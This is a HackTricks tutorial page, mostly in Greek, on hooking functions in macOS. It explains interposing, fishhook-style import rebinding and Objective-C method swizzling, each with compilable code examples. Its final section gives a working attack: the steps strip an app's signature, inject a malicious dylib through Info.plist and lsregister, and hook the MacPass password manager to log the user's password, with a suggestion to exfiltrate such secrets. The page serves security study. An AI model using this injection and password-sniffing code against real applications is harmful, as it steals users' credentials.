# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Δημιουργήστε ένα **dylib** με ένα section **`__interpose` (`__DATA___interpose`)** (ή ένα section με flag **`S_INTERPOSING`**) που περιέχει tuples από **function pointers**, οι οποίοι αναφέρονται στις **original** και **replacement** functions.

Στη συνέχεια, κάντε **inject** το dylib με το **`DYLD_INSERT_LIBRARIES`** (το interposing πρέπει να πραγματοποιηθεί πριν φορτωθεί η κύρια εφαρμογή). Προφανώς, οι [**περιορισμοί** που ισχύουν για τη χρήση του **`DYLD_INSERT_LIBRARIES`** ισχύουν και εδώ](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Η μεταβλητή περιβάλλοντος **`DYLD_PRINT_INTERPOSING`** μπορεί να χρησιμοποιηθεί για debugging του interposing και θα εκτυπώσει τη διαδικασία interpose.

Σημειώστε επίσης ότι το **interposing πραγματοποιείται μεταξύ της διεργασίας και των loaded libraries**, επομένως δεν λειτουργεί με το shared library cache.

### Dynamic Interposing

Τώρα είναι επίσης δυνατή η δυναμική εφαρμογή interpose σε μια function χρησιμοποιώντας τη function **`dyld_dynamic_interpose`**. Αυτό επιτρέπει το **programmatic interpose** μιας function σε **runtime**, αντί να πραγματοποιείται μόνο από την **αρχή**.

Χρειάζεται απλώς να καθοριστούν οι **πλειάδες** της **function προς αντικατάσταση και της replacement** function.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Αν έχετε ήδη δυνατότητα εκτέλεσης κώδικα **μέσα στη διεργασία** και θέλετε να κάνετε hook σε μια **εισαγόμενη C function** χωρίς επανεκκίνηση του target, ένα πολύ συνηθισμένο primitive είναι το **symbol rebinding** (που έγινε δημοφιλές από το **`fishhook`**).

Αντί να χρησιμοποιεί το section **`__interpose`**, αυτή η τεχνική διατρέχει τα μεταδεδομένα Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) και **αντικαθιστά το import slot** που χρησιμοποιείται από το τρέχον image. Αυτό είναι ιδιαίτερα χρήσιμο για hooking functions σε μια **ήδη εκτελούμενη** διεργασία ή για hooking **μόνο ενός image** με το `rebind_symbols_image`.<sup>[2]</sup>

> [!TIP]
> Αυτό επηρεάζει μόνο τις κλήσεις που περνούν πράγματι μέσω ενός **import pointer**. Αν η target function καλείται απευθείας μέσα στο ίδιο image, δεν υπάρχει imported slot για αντικατάσταση, επομένως αυτή η τεχνική δεν θα εντοπίσει εκείνο το call site.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Σε πρόσφατες εκδόσεις του macOS, πολλοί στόχοι rebinding δεν βρίσκονται πλέον σε εγγράψιμες σελίδες **`__DATA`**. Τα rebinder συνήθως χρειάζεται να κάνουν προσωρινά εγγράψιμο το **`__DATA_CONST`** πριν διορθώσουν τον pointer. Επιπλέον, σε Apple Silicon / **`arm64e`** θα πρέπει να αναμένετε authenticated pointers και επιπλέον indirection στο **`__AUTH_CONST.__auth_got`**, επομένως ένα rebinder που σαρώνει μόνο τα κλασικά sections των lazy/non-lazy symbol pointers μπορεί να παραλείψει ορισμένα call sites.<sup>[3]</sup>

> [!CAUTION]
> Το ABI **`arm64e`** χρησιμοποιεί **Pointer Authentication (PAC)** για πολλούς function pointers. Τυφλές εγγραφές pointers που λειτουργούσαν παλαιότερα σε Intel μπορούν να καταστρέψουν ένα call site σε Apple Silicon. Όταν γράφετε το δικό σας rebinder ή inline hooker, να είστε έτοιμοι να χρησιμοποιήσετε helpers του **`<ptrauth.h>`**, όπως τα **`ptrauth_sign_unauthenticated`** ή **`ptrauth_auth_and_resign`**, και να κάνετε δοκιμές ειδικά σε targets **`arm64e`**.

Για περισσότερες λεπτομέρειες σχετικά με τα **`__AUTH`**, **`__AUTH_CONST`** και **`__auth_got`**, δείτε [αυτή τη σελίδα](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

Στο ObjectiveC, μια μέθοδος καλείται ως εξής: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Χρειάζονται το **object**, η **method** και τα **params**. Όταν καλείται μια method, αποστέλλεται ένα **msg** με χρήση της function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Το object είναι το **`someObject`**, η method είναι η **`@selector(method1p1:p2:)`** και τα arguments είναι τα **value1**, **value2**.

Ακολουθώντας τις δομές των objects, είναι δυνατό να φτάσουμε σε ένα **array of methods**, όπου βρίσκονται τα **names** και οι **pointers** προς τον κώδικα των methods.

> [!CAUTION]
> Σημειώστε ότι, επειδή οι methods και οι classes προσπελαύνονται με βάση τα ονόματά τους, αυτές οι πληροφορίες αποθηκεύονται στο binary, επομένως είναι δυνατό να ανακτηθούν με `otool -ov </path/bin>` ή [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Είναι δυνατό να προσπελάσετε πληροφορίες των methods, όπως το όνομα, τον αριθμό των params ή τη διεύθυνση, όπως στο ακόλουθο παράδειγμα:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Η function **`method_exchangeImplementations`** επιτρέπει την **αλλαγή** της **διεύθυνσης** της **implementation** **μίας function με την άλλη**.

> [!CAUTION]
> Επομένως, όταν καλείται μία function, **εκτελείται η άλλη**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Σε αυτή την περίπτωση, αν ο κώδικας **implementation** της **legit** **method** **επαληθεύει** το **όνομα** της **method**, θα μπορούσε να **εντοπίσει** αυτό το swizzling και να αποτρέψει την εκτέλεσή του.
>
> Η ακόλουθη technique δεν έχει αυτόν τον περιορισμό.

### Method Swizzling with method_setImplementation

Η προηγούμενη μορφή είναι περίεργη, επειδή αλλάζετε το implementation 2 methods, το ένα με το άλλο. Χρησιμοποιώντας τη function **`method_setImplementation`**, μπορείτε να **αλλάξετε** το **implementation** μιας **method** με εκείνο της άλλης.

Απλώς θυμηθείτε να **αποθηκεύσετε τη διεύθυνση** του implementation της αρχικής method, αν πρόκειται να την καλέσετε από το νέο implementation, πριν την αντικαταστήσετε, επειδή αργότερα θα είναι πολύ πιο δύσκολο να εντοπίσετε αυτή τη διεύθυνση.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Μεθοδολογία Hooking Attack

Σε αυτήν τη σελίδα συζητήθηκαν διαφορετικοί τρόποι για το hooking functions. Ωστόσο, απαιτούσαν **εκτέλεση κώδικα μέσα στη διεργασία που αποτελεί στόχο της επίθεσης**.

Για να γίνει αυτό, η ευκολότερη τεχνική είναι η έγχυση ενός [Dyld μέσω environment variables ή hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Ωστόσο, υποθέτω ότι αυτό θα μπορούσε επίσης να γίνει μέσω [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Ωστόσο, και οι δύο επιλογές είναι **περιορισμένες** σε **μη προστατευμένα** binaries/processes. Ελέγξτε κάθε τεχνική για να μάθετε περισσότερα σχετικά με τους περιορισμούς.

Ωστόσο, ένα function hooking attack είναι πολύ συγκεκριμένο: ένας attacker θα το χρησιμοποιήσει για να **κλέψει ευαίσθητες πληροφορίες από το εσωτερικό μιας διεργασίας** (διαφορετικά, θα εκτελούσατε απλώς ένα process injection attack). Και αυτές οι ευαίσθητες πληροφορίες μπορεί να βρίσκονται σε Apps που έχει κατεβάσει ο χρήστης, όπως το MacPass.

Επομένως, το attack vector θα ήταν είτε να βρεθεί ένα vulnerability είτε να αφαιρεθεί η signature της εφαρμογής και να γίνει inject η μεταβλητή περιβάλλοντος **`DYLD_INSERT_LIBRARIES`** μέσω του Info.plist της εφαρμογής, προσθέτοντας κάτι όπως:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
και στη συνέχεια **καταχωρίστε εκ νέου** την εφαρμογή:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Προσθέστε σε αυτήν τη βιβλιοθήκη τον hooking code για exfiltrate των πληροφοριών: Κωδικοί πρόσβασης, μηνύματα...

> [!CAUTION]
> Σημειώστε ότι σε νεότερες εκδόσεις του macOS, αν **αφαιρέσετε την υπογραφή** από το application binary και αυτό είχε εκτελεστεί προηγουμένως, το macOS **δεν θα εκτελεί πλέον την εφαρμογή**.

#### Παράδειγμα βιβλιοθήκης
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Αναφορές

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Μια βιβλιοθήκη που απλοποιεί τη διαδικασία δυναμικής επανασύνδεσης συμβόλων σε δυαδικά αρχεία Mach-O](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Τεκμηρίωση Clang](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
